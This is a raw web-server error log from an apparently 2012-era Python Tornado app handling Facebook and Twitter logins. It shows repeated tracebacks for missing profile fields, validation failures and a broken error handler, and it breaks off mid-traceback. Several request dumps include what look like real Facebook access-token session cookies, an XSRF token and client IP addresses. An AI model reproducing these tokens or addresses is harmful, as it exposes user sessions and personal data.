Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348059227.1349702875.4; __utmb=188782963.1.10.1349702875; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.71ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5072d8028e4c855a2755405c has successfully logged in.
INFO:intheory-8003:Facebook user with id 5072d8028e4c855a2755405c has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 5072db388e4c855a20ed936b has successfully logged in.
INFO:intheory-8000:Facebook user with id 5072db388e4c855a20ed936b has successfully logged in.
Facebook user with id 5072db388e4c855a20ed936b has successfully logged in.
INFO:intheory-8000:Facebook user with id 5072db388e4c855a20ed936b has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'fb_id', 'email'])
Facebook user with id 5072e3db8e4c855a131320eb has successfully logged in.
INFO:intheory-8001:Facebook user with id 5072e3db8e4c855a131320eb has successfully logged in.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348059227.1349702875.4; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.53ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348059227.1349702875.4; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.68ms
Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
INFO:intheory-8002:Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
INFO:intheory-8003:Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348178970.1348219667.4; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '195.58.86.9'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.80ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348178970.1348219667.4; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '195.58.86.9'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 6.00ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 5072eab88e4c855a20ed937a has successfully logged in.
INFO:intheory-8002:Facebook user with id 5072eab88e4c855a20ed937a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5072ebe18e4c855a27554069 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5072ebe18e4c855a27554069 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Facebook user with id 5072e3db8e4c855a131320eb has successfully logged in.
INFO:intheory-8002:Facebook user with id 5072e3db8e4c855a131320eb has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
